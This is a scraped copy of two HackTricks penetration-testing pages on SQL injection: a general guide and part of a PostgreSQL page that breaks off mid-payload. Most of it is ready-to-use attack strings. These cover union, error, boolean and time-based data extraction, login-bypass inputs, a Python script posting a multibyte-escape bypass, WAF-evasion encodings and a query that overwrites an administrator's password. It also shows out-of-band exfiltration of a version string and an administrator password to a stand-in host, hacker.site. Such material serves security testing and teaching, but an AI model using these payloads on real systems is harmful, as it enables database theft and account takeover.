[
  {
    "content": "Learn & practice AWS Hacking: HackTricks Training AWS Red Team Expert (ARTE) Learn & practice GCP Hacking: HackTricks Training GCP Red Team Expert (GRTE) Learn & practice Az Hacking: HackTricks Training Azure Red Team Expert (AzRTE)\nJoin the ð¬ Discord group or the telegram group or follow us on Twitter ð¦ @hacktricks_live .\nShare hacking tricks by submitting PRs to the HackTricks and HackTricks Cloud github repos.\nAn SQL injection is a security flaw that allows attackers to interfere with database queries of an application. This vulnerability can enable attackers to view , modify , or delete data they shouldn't access, including information of other users or any data the application can access. Such actions may result in permanent changes to the application's functionality or content or even compromision of the server or denial of service.\nWhen a site appears to be vulnerable to SQL injection (SQLi) due to unusual server responses to SQLi-related inputs, the first step is to understand how to inject data into the query without disrupting it . This requires identifying the method to escape from the current context effectively. These are some useful examples:\n[Nothing] ' \" ` ') \") `) ')) \")) `))\n[Nothing] ' \" ` ') \") `) ')) \")) `))\nThen, you need to know how to fix the query so there isn't errors . In order to fix the query you can input data so the previous query accept the new data , or you can just input your data and add a comment symbol add the end .\nNote that if you can see error messages or you can spot differences when a query is working and when it's not this phase will be more easy.\nMySQL #comment -- comment [Note the space after the double dash] /*comment*/ /*! MYSQL Special SQL */ PostgreSQL --comment /*comment*/ MSQL --comment /*comment*/ Oracle --comment SQLite --comment /*comment*/ HQL HQL does not support comments\nMySQL #comment -- comment [Note the space after the double dash] /*comment*/ /*! MYSQL Special SQL */ PostgreSQL --comment /*comment*/ MSQL --comment /*comment*/ Oracle --comment SQLite --comment /*comment*/ HQL HQL does not support comments\nConfirming with logical operations\nA reliable method to confirm an SQL injection vulnerability involves executing a logical operation and observing the expected outcomes. For instance, a GET parameter such as ?username=Peter yielding identical content when modified to ?username=Peter' or '1'='1 indicates a SQL injection vulnerability.\nSimilarly, the application of mathematical operations serves as an effective confirmation technique. For example, if accessing ?id=1 and ?id=2-1 produce the same result, it's indicative of SQL injection.\nExamples demonstrating logical operation confirmation:\npage.asp?id=1 or 1=1 -- results in true page.asp?id=1' or 1=1 -- results in true page.asp?id=1\" or 1=1 -- results in true page.asp?id=1 and 1=2 -- results in false\npage.asp?id=1 or 1=1 -- results in true page.asp?id=1' or 1=1 -- results in true page.asp?id=1\" or 1=1 -- results in true page.asp?id=1 and 1=2 -- results in false\nThis word-list was created to try to confirm SQLinjections in the proposed way:\nIn some cases you won't notice any change on the page you are testing. Therefore, a good way to discover blind SQL injections is making the DB perform actions and will have an impact on the time the page need to load. Therefore, the we are going to concat in the SQL query an operation that will take a lot of time to complete:\nMySQL (string concat and logical ops) 1' + sleep(10) 1' and sleep(10) 1' && sleep(10) 1' | sleep(10) PostgreSQL (only support string concat) 1' || pg_sleep(10) MSQL 1' WAITFOR DELAY '0:0:10' Oracle 1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10) SQLite 1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) 1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\nMySQL (string concat and logical ops) 1' + sleep(10) 1' and sleep(10) 1' && sleep(10) 1' | sleep(10) PostgreSQL (only support string concat) 1' || pg_sleep(10) MSQL 1' WAITFOR DELAY '0:0:10' Oracle 1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) 1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10) SQLite 1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2)))) 1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))\nIn some cases the sleep functions won't be allowed . Then, instead of using those functions you could make the query perform complex operations that will take several seconds. Examples of these techniques are going to be commented separately on each technology (if any) .\nThe best way to identify the back-end is trying to execute functions of the different back-ends. You could use the sleep functions of the previous section or these ones (table from payloadsallthethings :\n[\"conv('a',16,2)=conv('a',16,2)\" ,\"MYSQL\"], [\"connection_id()=connection_id()\" ,\"MYSQL\"], [\"crc32('MySQL')=crc32('MySQL')\" ,\"MYSQL\"], [\"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\" ,\"MSSQL\"], [\"@@CONNECTIONS>0\" ,\"MSSQL\"], [\"@@CONNECTIONS=@@CONNECTIONS\" ,\"MSSQL\"], [\"@@CPU_BUSY=@@CPU_BUSY\" ,\"MSSQL\"], [\"USER_ID(1)=USER_ID(1)\" ,\"MSSQL\"], [\"ROWNUM=ROWNUM\" ,\"ORACLE\"], [\"RAWTOHEX('AB')=RAWTOHEX('AB')\" ,\"ORACLE\"], [\"LNNVL(0=123)\" ,\"ORACLE\"], [\"5::int=5\" ,\"POSTGRESQL\"], [\"5::integer=5\" ,\"POSTGRESQL\"], [\"pg_client_encoding()=pg_client_encoding()\" ,\"POSTGRESQL\"], [\"get_current_ts_config()=get_current_ts_config()\" ,\"POSTGRESQL\"], [\"quote_literal(42.5)=quote_literal(42.5)\" ,\"POSTGRESQL\"], [\"current_database()=current_database()\" ,\"POSTGRESQL\"], [\"sqlite_version()=sqlite_version()\" ,\"SQLITE\"], [\"last_insert_rowid()>1\" ,\"SQLITE\"], [\"last_insert_rowid()=last_insert_rowid()\" ,\"SQLITE\"], [\"val(cvar(1))=1\" ,\"MSACCESS\"], [\"IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0\" ,\"MSACCESS\"], [\"cdbl(1)=cdbl(1)\" ,\"MSACCESS\"], [\"1337=1337\", \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"], [\"'i'='i'\", \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"],\n[\"conv('a',16,2)=conv('a',16,2)\" ,\"MYSQL\"], [\"connection_id()=connection_id()\" ,\"MYSQL\"], [\"crc32('MySQL')=crc32('MySQL')\" ,\"MYSQL\"], [\"BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)\" ,\"MSSQL\"], [\"@@CONNECTIONS>0\" ,\"MSSQL\"], [\"@@CONNECTIONS=@@CONNECTIONS\" ,\"MSSQL\"], [\"@@CPU_BUSY=@@CPU_BUSY\" ,\"MSSQL\"], [\"USER_ID(1)=USER_ID(1)\" ,\"MSSQL\"], [\"ROWNUM=ROWNUM\" ,\"ORACLE\"], [\"RAWTOHEX('AB')=RAWTOHEX('AB')\" ,\"ORACLE\"], [\"LNNVL(0=123)\" ,\"ORACLE\"], [\"5::int=5\" ,\"POSTGRESQL\"], [\"5::integer=5\" ,\"POSTGRESQL\"], [\"pg_client_encoding()=pg_client_encoding()\" ,\"POSTGRESQL\"], [\"get_current_ts_config()=get_current_ts_config()\" ,\"POSTGRESQL\"], [\"quote_literal(42.5)=quote_literal(42.5)\" ,\"POSTGRESQL\"], [\"current_database()=current_database()\" ,\"POSTGRESQL\"], [\"sqlite_version()=sqlite_version()\" ,\"SQLITE\"], [\"last_insert_rowid()>1\" ,\"SQLITE\"], [\"last_insert_rowid()=last_insert_rowid()\" ,\"SQLITE\"], [\"val(cvar(1))=1\" ,\"MSACCESS\"], [\"IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0\" ,\"MSACCESS\"], [\"cdbl(1)=cdbl(1)\" ,\"MSACCESS\"], [\"1337=1337\", \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"], [\"'i'='i'\", \"MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL\"],\nAlso, if you have access to the output of the query, you could make it print the version of the database .\nA continuation we are going to discuss different methods to exploit different kinds of SQL Injection. We will use MySQL as example.\nSQL injection cheat sheet | Web Security Academy\nIf you can see the output of the query this is the best way to exploit it. First of all, wee need to find out the number of columns the initial request is returning. This is because both queries must return the same number of columns . Two methods are typically used for this purpose:\nTo determine the number of columns in a query, incrementally adjust the number used in ORDER BY or GROUP BY clauses until a false response is received. Despite the distinct functionalities of GROUP BY and ORDER BY within SQL, both can be utilized identically for ascertaining the query's column count.\n1' ORDER BY 1--+ #True 1' ORDER BY 2--+ #True 1' ORDER BY 3--+ #True 1' ORDER BY 4--+ #False - Query is only using 3 columns #-1' UNION SELECT 1,2,3--+ True\n1' ORDER BY 1--+ #True 1' ORDER BY 2--+ #True 1' ORDER BY 3--+ #True 1' ORDER BY 4--+ #False - Query is only using 3 columns #-1' UNION SELECT 1,2,3--+ True\n1' GROUP BY 1--+ #True 1' GROUP BY 2--+ #True 1' GROUP BY 3--+ #True 1' GROUP BY 4--+ #False - Query is only using 3 columns #-1' UNION SELECT 1,2,3--+ True\n1' GROUP BY 1--+ #True 1' GROUP BY 2--+ #True 1' GROUP BY 3--+ #True 1' GROUP BY 4--+ #False - Query is only using 3 columns #-1' UNION SELECT 1,2,3--+ True\nSelect more and more null values until the query is correct:\n1' UNION SELECT null-- - Not working 1' UNION SELECT null,null-- - Not working 1' UNION SELECT null,null,null-- - Worked\n1' UNION SELECT null-- - Not working 1' UNION SELECT null,null-- - Not working 1' UNION SELECT null,null,null-- - Worked\nYou should use null values as in some cases the type of the columns of both sides of the query must be the same and null is valid in every case.\nExtract database names, table names and column names\nOn the next examples we are going to retrieve the name of all the databases, the table name of a database, the column names of the table:\n#Database names -1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata #Tables of a database -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database] #Column names -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]\n#Database names -1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata #Tables of a database -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database] #Column names -1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]\nThere is a different way to discover this data on every different database, but it's always the same methodology.\nWhen the output of a query is visible, but a union-based injection seems unachievable, it signifies the presence of a hidden union-based injection . This scenario often leads to a blind injection situation. To transform a blind injection into a union-based one, the execution query on the backend needs to be discerned.\nThis can be accomplished through the use of blind injection techniques alongside the default tables specific to your target Database Management System (DBMS). For understanding these default tables, consulting the documentation of the target DBMS is advised.\nOnce the query has been extracted, it's necessary to tailor your payload to safely close the original query. Subsequently, a union query is appended to your payload, facilitating the exploitation of the newly accessible union-based injection.\nFor more comprehensive insights, refer to the complete article available at Healing Blind Injections .\nIf for some reason you cannot see the output of the query but you can see the error messages , you can make this error messages to ex-filtrate data from the database. Following a similar flow as in the Union Based exploitation you could manage to dump the DB.\n(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))\n(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))\nIn this case you cannot see the results of the query or the errors, but you can distinguished when the query return a true or a false response because there are different contents on the page. In this case, you can abuse that behaviour to dump the database char by char:\n?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'\n?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'\nThis is the same case as before but instead of distinguish between a true/false response from the query you can distinguish between an error in the SQL query or not (maybe because the HTTP server crashes). Therefore, in this case you can force an SQLerror each time you guess correctly the char:\nAND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -\nAND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -\nIn this case there isn't any way to distinguish the response of the query based on the context of the page. But, you can make the page take longer to load if the guessed character is correct. We have already saw this technique in use before in order to confirm a SQLi vuln .\n1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#\n1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#\nYou can use stacked queries to execute multiple queries in succession . Note that while the subsequent queries are executed, the results are not returned to the application . Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.\nOracle doesn't support stacked queries. MySQL, Microsoft and PostgreSQL support them: QUERY-1-HERE; QUERY-2-HERE\nIf no-other exploitation method worked , you may try to make the database ex-filtrate the info to an external host controlled by you. For example, via DNS queries:\nselect load_file(concat('\\\\\\\\',version(),'.hacker.site\\\\a.txt'));\nselect load_file(concat('\\\\\\\\',version(),'.hacker.site\\\\a.txt'));\nOut of band data exfiltration via XXE\na' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/\"> %remote;]>'),'/l') FROM dual-- -\na' UNION SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/\"> %remote;]>'),'/l') FROM dual-- -\nCheck the SQLMap Cheatsheet to exploit a SQLi vulnerability with sqlmap .\nWe have already discussed all the ways to exploit a SQL Injection vulnerability. Find some more tricks database technology dependant in this book:\nOr you will find a lot of tricks regarding: MySQL, PostgreSQL, Oracle, MSSQL, SQLite and HQL in https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection\nList to try to bypass the login functionality:\n\"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\"\n\"SELECT * FROM admin WHERE pass = '\".md5($password,true).\"'\"\nThis query showcases a vulnerability when MD5 is used with true for raw output in authentication checks, making the system susceptible to SQL injection. Attackers can exploit this by crafting inputs that, when hashed, produce unexpected SQL command parts, leading to unauthorized access.\nmd5(\"ffifdyop\", true) = 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bï¿½ sha1(\"3fDf \", true) = Qï¿½u'='ï¿½@ï¿½[ï¿½tï¿½- oï¿½ï¿½_-!\nmd5(\"ffifdyop\", true) = 'or'6ï¿½]ï¿½ï¿½!r,ï¿½ï¿½bï¿½ sha1(\"3fDf \", true) = Qï¿½u'='ï¿½@ï¿½[ï¿½tï¿½- oï¿½ï¿½_-!\nInjected hash authentication Bypass\nadmin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'\nadmin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'\nYou should use as username each line of the list and as password always: Pass1234. (This payloads are also included in the big list mentioned at the beginning of this section)\nIF ' is being scaped you can use %A8%27, and when ' gets scaped it will be created: 0xA80x5c0x27 ( â' )\n%A8%27 OR 1=1;-- 2 %8C%A8%27 OR 1=1-- 2 %bf' or 1=1 -- --\n%A8%27 OR 1=1;-- 2 %8C%A8%27 OR 1=1-- 2 %bf' or 1=1 -- --\nimport requests url = \"http://example.com/index.php\" cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3') datas = {\"login\": chr(0xbf) + chr(0x27) + \"OR 1=1 #\", \"password\":\"test\"} r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url}) print r.text\nimport requests url = \"http://example.com/index.php\" cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3') datas = {\"login\": chr(0xbf) + chr(0x27) + \"OR 1=1 #\", \"password\":\"test\"} r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url}) print r.text\nPolyglot injection (multicontext)\nSLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/\nSLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/\nModify password of existing object/user\nTo do so you should try to create a new object named as the \"master object\" (probably admin in case of users) modifying something:\nCreate user named: AdMIn (uppercase & lowercase letters)\nSQL Truncation Attack (when there is some kind of length limit in the username or email) --> Create user with name: admin [a lot of spaces] a\nIf the database is vulnerable and the max number of chars for username is for example 30 and you want to impersonate the user admin , try to create a username called: \" admin [30 spaces] a \" and any password.\nThe database will check if the introduced username exists inside the database. If not , it will cut the username to the max allowed number of characters (in this case to: \" admin [25 spaces] \") and the it will automatically remove all the spaces at the end updating inside the database the user \" admin \" with the new password (some error could appear but it doesn't means that this hasn't worked).\nMore info: https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html & https://resources.infosecinstitute.com/sql-truncation-attack/#gref\nNote: This attack will no longer work as described above in latest MySQL installations. While comparisons still ignore trailing whitespace by default, attempting to insert a string that is longer than the length of a field will result in an error, and the insertion will fail. For more information about about this check: https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation\nMySQL Insert time based checking\nAdd as much ','','' as you consider to exit the VALUES statement. If delay is executed, you have a SQLInjection.\nname=','');WAITFOR%20DELAY%20'0:0:5'--%20-\nname=','');WAITFOR%20DELAY%20'0:0:5'--%20-\nThe ON DUPLICATE KEY UPDATE clause in MySQL is utilized to specify actions for the database to take when an attempt is made to insert a row that would result in a duplicate value in a UNIQUE index or PRIMARY KEY. The following example demonstrates how this feature can be exploited to modify the password of an administrator account:\nAn injection payload might be crafted as follows, where two rows are attempted to be inserted into the users table. The first row is a decoy, and the second row targets an existing administrator's email with the intention of updating the password:\nINSERT INTO users (email, password) VALUES (\"generic_user@example.com\", \"bcrypt_hash_of_newpassword\"), (\"admin_generic@example.com\", \"bcrypt_hash_of_newpassword\") ON DUPLICATE KEY UPDATE password=\"bcrypt_hash_of_newpassword\" -- \";\nINSERT INTO users (email, password) VALUES (\"generic_user@example.com\", \"bcrypt_hash_of_newpassword\"), (\"admin_generic@example.com\", \"bcrypt_hash_of_newpassword\") ON DUPLICATE KEY UPDATE password=\"bcrypt_hash_of_newpassword\" -- \";\nThe query attempts to insert two rows: one for generic_user@example.com and another for admin_generic@example.com .\nIf the row for admin_generic@example.com already exists, the ON DUPLICATE KEY UPDATE clause triggers, instructing MySQL to update the password field of the existing row to \"bcrypt_hash_of_newpassword\".\nConsequently, authentication can then be attempted using admin_generic@example.com with the password corresponding to the bcrypt hash (\"bcrypt_hash_of_newpassword\" represents the new password's bcrypt hash, which should be replaced with the actual hash of the desired password).\nWhen trying to create a new user and username, password and email are needed:\nSQLi payload: username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- - A new user with username=otherUsername, password=otherPassword, email:FLAG will be created\nSQLi payload: username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- - A new user with username=otherUsername, password=otherPassword, email:FLAG will be created\nWith this technique you can extract information creating only 1 account. It is important to note that you don't need to comment anything.\n'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'\n'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'\n__import__('binascii').unhexlify(hex(215573607263)[2:])\n__import__('binascii').unhexlify(hex(215573607263)[2:])\nUsing hex and replace (and substr ):\n'+(select hex(replace(replace(replace(replace(replace(replace(table_name,\"j\",\" \"),\"k\",\"!\"),\"l\",\"\\\"\"),\"m\",\"#\"),\"o\",\"$\"),\"_\",\"%\")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+' '+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),\"j\",\" \"),\"k\",\"!\"),\"l\",\"\\\"\"),\"m\",\"#\"),\"o\",\"$\"),\"_\",\"%\")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+' #Full ascii uppercase and lowercase replace: '+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),\"j\",\" \"),\"k\",\"!\"),\"l\",\"\\\"\"),\"m\",\"#\"),\"o\",\"$\"),\"_\",\"%\"),\"z\",\"&\"),\"J\",\"'\"),\"K\",\"`\"),\"L\",\"(\"),\"M\",\")\"),\"N\",\"@\"),\"O\",\"$$\"),\"Z\",\"&&\")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'\n'+(select hex(replace(replace(replace(replace(replace(replace(table_name,\"j\",\" \"),\"k\",\"!\"),\"l\",\"\\\"\"),\"m\",\"#\"),\"o\",\"$\"),\"_\",\"%\")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+' '+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),\"j\",\" \"),\"k\",\"!\"),\"l\",\"\\\"\"),\"m\",\"#\"),\"o\",\"$\"),\"_\",\"%\")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+' #Full ascii uppercase and lowercase replace: '+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),\"j\",\" \"),\"k\",\"!\"),\"l\",\"\\\"\"),\"m\",\"#\"),\"o\",\"$\"),\"_\",\"%\"),\"z\",\"&\"),\"J\",\"'\"),\"K\",\"`\"),\"L\",\"(\"),\"M\",\")\"),\"N\",\"@\"),\"O\",\"$$\"),\"Z\",\"&&\")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'\nRouted SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output. ( From Paper )\n#Hex of: -1' union select login,password from users-- a -1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a\n#Hex of: -1' union select login,password from users-- a -1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a\nNo Space (%20) - bypass using whitespace alternatives\n?id=1%09and%091=1%09-- ?id=1%0Dand%0D1=1%0D-- ?id=1%0Cand%0C1=1%0C-- ?id=1%0Band%0B1=1%0B-- ?id=1%0Aand%0A1=1%0A-- ?id=1%A0and%A01=1%A0--\n?id=1%09and%091=1%09-- ?id=1%0Dand%0D1=1%0D-- ?id=1%0Cand%0C1=1%0C-- ?id=1%0Band%0B1=1%0B-- ?id=1%0Aand%0A1=1%0A-- ?id=1%A0and%A01=1%A0--\nNo Whitespace - bypass using comments\n?id=1/*comment*/and/**/1=1/**/--\n?id=1/*comment*/and/**/1=1/**/--\nNo Whitespace - bypass using parenthesis\nNo Comma - bypass using OFFSET, FROM and JOIN\nLIMIT 0,1 -> LIMIT 1 OFFSET 0 SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1). SELECT 1,2,3,4 -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d\nLIMIT 0,1 -> LIMIT 1 OFFSET 0 SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1). SELECT 1,2,3,4 -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d\nBlacklist using keywords - bypass using uppercase/lowercase\n?id=1 AND 1=1# ?id=1 AnD 1=1# ?id=1 aNd 1=1#\n?id=1 AND 1=1# ?id=1 AnD 1=1# ?id=1 aNd 1=1#\nBlacklist using keywords case insensitive - bypass using an equivalent operator\nAND -> && -> %26%26 OR -> || -> %7C%7C = -> LIKE,REGEXP,RLIKE, not < and not > > X -> not between 0 and X WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))\nAND -> && -> %26%26 OR -> || -> %7C%7C = -> LIKE,REGEXP,RLIKE, not < and not > > X -> not between 0 and X WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))\nYou can find a more in depth explaination of this trick in gosecure blog . Basically you can use the scientific notation in unexpected ways for the WAF to bypass it:\n-1' or 1.e(1) or '1'='1 -1' or 1337.1337e1 or '1'='1 ' or 1.e('')=\n-1' or 1.e(1) or '1'='1 -1' or 1337.1337e1 or '1'='1 ' or 1.e('')=\nBypass Column Names Restriction\nFirst of all, notice that if the original query and the table where you want to extract the flag from have the same amount of columns you might just do: 0 UNION SELECT * FROM flag\nItâs possible to access the third column of a table without using its name using a query like the following: SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F; , so in an sqlinjection this would looks like:\nSELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;\n# This is an example with 3 columns that will extract the column number 3 -1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;\n# This is an example with 3 columns that will extract the column number 3 -1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;\n# In this case, it's extracting the third value from a 4 values table and returning 3 values in the \"union select\" -1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c\n# In this case, it's extracting the third value from a 4 values table and returning 3 values in the \"union select\" -1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c\nThis trick was taken from https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/\nGitHub - m4ll0k/Atlas: Quick SQLMap Tamper Suggester\nhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection\nAuto_Wordlists/wordlists/sqli.txt at main \\xc2\\xb7 carlospolop/Auto_Wordlists \\xc2\\xb7 GitHub\nLearn & practice AWS Hacking: HackTricks Training AWS Red Team Expert (ARTE) Learn & practice GCP Hacking: HackTricks Training GCP Red Team Expert (GRTE) Learn & practice Az Hacking: HackTricks Training Azure Red Team Expert (AzRTE)\nJoin the ð¬ Discord group or the telegram group or follow us on Twitter ð¦ @hacktricks_live .\nShare hacking tricks by submitting PRs to the HackTricks and HackTricks Cloud github repos.",
    "source": "https://book.hacktricks.wiki/en/pentesting-web/sql-injection/index.html",
    "metadata": {
      "title": "HackTricks SQLi"
    }
  },
  {
    "content": "Learn & practice AWS Hacking: HackTricks Training AWS Red Team Expert (ARTE) Learn & practice GCP Hacking: HackTricks Training GCP Red Team Expert (GRTE) Learn & practice Az Hacking: HackTricks Training Azure Red Team Expert (AzRTE)\nJoin the ð¬ Discord group or the telegram group or follow us on Twitter ð¦ @hacktricks_live .\nShare hacking tricks by submitting PRs to the HackTricks and HackTricks Cloud github repos.\nThis page aims to explain different tricks that could help you to exploit a SQLinjection found in a postgresql database and to compliment the tricks you can find on https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md\nNetwork Interaction - Privilege Escalation, Port Scanner, NTLM challenge response disclosure & Exfiltration\nThe PostgreSQL module dblink offers capabilities for connecting to other PostgreSQL instances and executing TCP connections. These features, combined with the COPY FROM functionality, enable actions like privilege escalation, port scanning, and NTLM challenge response capture. For detailed methods on executing these attacks check how to perform these attacks .\nExfiltration example using dblink and large objects\nYou can read this example to see a CTF example of how to load data inside large objects and then exfiltrate the content of large objects inside the username of the function dblink_connect .\nPostgreSQL Attacks: Read/write, RCE, privesc\nCheck how to compromise the host and escalate privileges from PostgreSQL in:\n5432,5433 - Pentesting Postgresql\nManipulating strings could help you to bypass WAFs or other restrictions . In this page you can find some useful Strings functions.\nRemember that postgresql support stacked queries, but several application will throw an error if 2 responses are returned when expecting just 1. But, you can still abuse the stacked queries via Time injection:\nid=1; select pg_sleep(10);-- - 1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -\nid=1; select pg_sleep(10);-- - 1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -\nThis function will return all the data in XML format in just one file. It's ideal if you want to dump a lot of data in just 1 row:\nSELECT query_to_xml('select * from pg_user',true,true,'');\nSELECT query_to_xml('select * from pg_user',true,true,'');\nThis function will dump the whole database in XML format in just 1 row (be careful if the database is very big as you may DoS it or even your own client):\nSELECT database_to_xml(true,true,'');\nSELECT database_to_xml(true,true,'');\nIf you can run queries passing them inside a string (for example using the query_to_xml function). You can use the convert_from to pass the string as hex and bypass filters this way:\nselect encode('select cast(string_agg(table_name, '','') as int) from information_schema.tables', 'hex'), convert_from('\\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573', 'UTF8'); # Bypass via stacked queries + error based + query_to_xml with hex ;select query_to_xml(convert_from('\\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,'')-- -h # Bypass via boolean + error based + query_to_xml with hex 1 or '1' = (query_to_xml(convert_from('\\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,''))::text-- -\nselect encode('select cast(string_agg(table_name, '','') as int) from information_schema.tables', 'hex'), convert_from('\\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573', 'UTF8'); # Bypass via stacked queries + error based + query_to_xml with hex ;select 